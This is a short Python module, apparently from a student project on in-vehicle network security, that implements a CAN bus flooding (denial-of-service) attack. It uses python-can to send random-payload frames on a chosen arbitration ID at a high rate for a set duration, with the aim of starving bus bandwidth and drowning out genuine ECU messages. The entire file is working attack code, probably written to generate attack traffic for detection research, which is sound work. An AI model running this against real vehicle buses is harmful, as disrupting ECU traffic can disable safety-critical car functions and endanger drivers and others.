# Author: Rayan Hamour (22103817)
"""
Flooding / denial-of-service attack: an attacker-controlled node blasts a
target arbitration ID at a rate far above its legitimate period, aiming to
starve bus bandwidth and/or drown out genuine ECU traffic.
"""

from __future__ import annotations

import random
import time

import can


def run_flood_attack(
    bus: can.Bus,
    target_id: int,
    duration_s: float,
    rate_hz: float,
    dlc: int = 8,
) -> int:
    """Send `target_id` as fast as `rate_hz` allows for `duration_s`. Returns count sent."""
    interval = 1.0 / rate_hz if rate_hz > 0 else 0.0
    end_time = time.monotonic() + duration_s
    sent = 0
    while time.monotonic() < end_time:
        msg = can.Message(
            arbitration_id=target_id,
            data=bytes(random.randint(0, 255) for _ in range(dlc)),
            is_extended_id=False,
        )
        try:
            bus.send(msg)
            sent += 1
        except can.CanError:
            pass
        if interval > 0:
            time.sleep(interval)
    return sent